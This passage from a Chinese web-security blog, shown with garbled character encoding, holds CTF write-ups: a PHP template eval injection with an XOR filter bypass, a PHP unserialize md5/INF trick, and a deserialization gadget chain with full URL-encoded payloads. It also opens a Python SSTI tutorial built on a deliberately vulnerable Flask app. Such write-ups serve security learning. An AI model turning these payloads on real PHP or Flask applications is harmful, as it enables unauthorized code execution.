<span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . $matches3[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> $s, $str=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹åˆ°<code>parserIfLabel</code>å‡½æ•°é‡Œçš„æ­£åˆ™</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>[\s\S]</code>è¡¨ç¤ºé€šé…ï¼Œçœ‹åˆ°åé¢æœ‰ä¸€ä¸ª<code>eval</code>å‡½æ•°ï¼Œå°è¯•æ˜¯å¦å¯ä»¥å†™è¿›å‡½æ•°ã€‚</p>
<p>è¿™é‡Œéšä¾¿è¯•ä¸€ä¸‹å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªæ­£åˆ™å¼å¯ä»¥åŒ¹é…çš„ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200821150736049.png" alt="image-20200821150736049" style="high:80%;width:80%;" />

<p>è¿™é‡Œåœ¨æœ¬åœ°æµ‹è¯•æŠŠ<code>danger_key</code>è¿‡æ»¤å‡½æ•°å»æ‰ä¹‹åå‘ç°ï¼Œå†ä¼ <code>phpinfo</code></p>
<p>ç›´æ¥å‡ºç°<code>phpinfo()</code>çš„é¡µé¢</p>
<img src="http://img.kawhi.xyz/image-20200821093807478.png" alt="image-20200821093807478" style="high:80%;width:80%;" />

<p>ç„¶åå°±æ˜¯ç»•è¿‡<code>danger_key</code>ï¼Œè¿™é‡Œè¿‡æ»¤phpä»¥åŠä¸€äº›å‡½æ•°ç­‰ç­‰ï¼Œå°è¯•ç”¨å¼‚æˆ–æ„é€ å­—ç¬¦ã€‚</p>
<p>å¼‚æˆ–æ„é€ <code>phpinfo()</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;4:49:R9&#x27;</span>^<span class="string">&#x27;DRDPT4V&#x27;</span>)()//phpinfo()</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zebqdx3ky4mu3qy28yg.cloudeci1.ichunqiu.com/?a=&#123;if:%20(%274:49:R9%27^%27DRDPT4V%27)()&#125;()&#123;end%20%20%20if&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥åœ¨phpinfoé‡Œé¢å‘ç°flagã€‚</p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a><strong>easytrick</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ä½ å¤ªé•¿äº†&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå‘ç°éœ€è¦<code>$trick1</code>å’Œ<code>$trick2</code>ä¸ç›¸ç­‰ï¼Œä½†æ˜¯md5å€¼ç›¸ç­‰çš„å¼ºç»•è¿‡ï¼Œè¿˜é™åˆ¶äº†é•¿åº¦ä¸èƒ½è¶…è¿‡5ï¼Œè€Œä¸”<code>$trick1</code>è¢«è½¬ä¸ºäº†<code>string</code>ï¼Œæ•°ç»„ç»•è¿‡å‘ç°ä¸å¯è¡Œã€‚</p>
<p>è¿™é‡Œå°±æ˜¯ä¸¤ä¸ªä¸åŒç±»å‹çš„å˜é‡ï¼Œä¸€ä¸ª<code>float</code>ï¼Œä¸€ä¸ª<code>string</code>ï¼Œåœ¨åšæ¯”è¾ƒæ—¶ä¸ç›¸ç­‰ï¼Œåœ¨md5å¤„ç†æ—¶ç›¸ç­‰ã€‚è¿™é‡Œå¯ä»¥ç”¨phpçš„INFï¼ˆæ— ç©·å¤§ï¼‰ã€‚</p>
<p>æ„é€ åºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zei1qumnps7gku8ou0x.cloudeci1.ichunqiu.com&#x2F;?trick&#x3D;O:5:%22trick%22:2:&#123;s:6:%22trick1%22;d:INF;s:6:%22trick2%22;d:INF;&#125;</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾çœ‹åˆ°flagã€‚</p>
<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a><strong>babyunserialize</strong></h2><p>WMCTFçš„é“¾ï¼Œæ”¹æ”¹å°±èƒ½ç”¨äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span>  $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> $events;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">phpinfo</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[-1=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;<span class="title">kawi</span>&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params">$offset, $value</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$val</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze0y4x958n38d0jl6pv.cloudeci1.ichunqiu.com/?flag=a%3A2%3A%7Bi%3A0%3BO%3A6%3A%22CLI%5CWS%22%3A0%3A%7B%7Di%3A1%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3Br%3A3%3Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3Bs%3A0%3A%22%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>

<p>flagåœ¨phpinfoé‡Œé¢ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/08/07/Python%20SSIT%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/07/Python%20SSIT%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">Python SSITå­¦ä¹ </a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-08-07 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-07T00:00:00+08:00">2020-08-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 21:05:10" itemprop="dateModified" datetime="2020-10-16T21:05:10+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">webå®‰å…¨</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>å­¦ä¹ ä¸€æ³¢æ¨¡æ¿æ³¨å…¥ï¼Œå‚è€ƒï¼š</p>
<p><a class="foo" target="_blank" href="https://xz.aliyun.com/t/6885#toc-0">Pythonæ¨¡æ¿æ³¨å…¥(SSTI)æ·±å…¥å­¦ä¹ </a></p>
<h1 id="ä»€ä¹ˆæ˜¯SSIT"><a href="#ä»€ä¹ˆæ˜¯SSIT" class="headerlink" title="ä»€ä¹ˆæ˜¯SSIT"></a><strong>ä»€ä¹ˆæ˜¯SSIT</strong></h1><blockquote>


ä¸¾ä¸€ä¸ªä¾‹å­

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œç›´æ¥å°†ç”¨æˆ·å¯æ§å‚æ•°`request.args.get('404_url')`åœ¨æ¨¡æ¿ä¸­ç›´æ¥æ¸²æŸ“å¹¶ä¼ å›é¡µé¢ä¸­ï¼Œè¿™ç§ä¸æ­£ç¡®çš„æ¸²æŸ“æ–¹æ³•ä¼šäº§ç”Ÿæ¨¡æ¿æ³¨å…¥(SSTI)ã€‚

<img src="http://img.kawhi.xyz/image-20200807151918090.png" style="high:80%;width:80%;" />

å¯ä»¥çœ‹åˆ°ï¼Œé¡µé¢ç›´æ¥è¿”å›äº†81è€Œä¸æ˜¯{{9*9}}

> 
</blockquote>
<h1 id="å¸¸è§çš„é­”æœ¯æ–¹æ³•"><a href="#å¸¸è§çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="å¸¸è§çš„é­”æœ¯æ–¹æ³•"></a><strong>å¸¸è§çš„é­”æœ¯æ–¹æ³•</strong></h1><ul>
<li><code>__class__</code></li>
</ul>
<p>ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">o = class1()</span><br><span class="line"></span><br><span class="line">print(o.__class__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.class1&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__bases__</code></li>
</ul>
<p>ä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span>(<span class="params">class1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(class2.__bases__)</span><br><span class="line"><span class="comment">#(&lt;class &#x27;__main__.class1&#x27;&gt;,)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__base__</code></li>
</ul>
<p>ä»¥å­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span>(<span class="params">class1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(class2.__base__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.class1&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__subclasses__()</code></li>
</ul>
<p>è·å–ç±»çš„æ‰€æœ‰å­ç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">Base1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(Base1.__subclasses__())</span><br><span class="line"><span class="comment">#[&lt;class &#x27;__main__.test&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__mro__</code></li>
</ul>
<p>è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºã€‚</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>æ‰€æœ‰è‡ªå¸¦å¸¦ç±»éƒ½åŒ…å«<strong>init</strong>æ–¹æ³•ï¼Œä¾¿äºåˆ©ç”¨ä»–å½“è·³æ¿æ¥è°ƒç”¨<strong>globals</strong>ã€‚</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p>ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨æ¨¡å—ï¼Œæ–¹æ³•å’Œå…¨å±€å˜é‡ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">var = <span class="number">2333</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(test.__init__.__globals__)</span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001B297C64668&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\1.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;os&#x27;: &lt;module &#x27;os&#x27; from &#x27;D:\\Python37\\lib\\os.py&#x27;&gt;, &#x27;var&#x27;: 2333, &#x27;fun&#x27;: &lt;function fun at 0x000001B297C1C1E0&gt;, &#x27;test&#x27;: &lt;class &#x27;__main__.test&#x27;&gt;&#125;</span></span><br></pre></td></tr></table></figure>

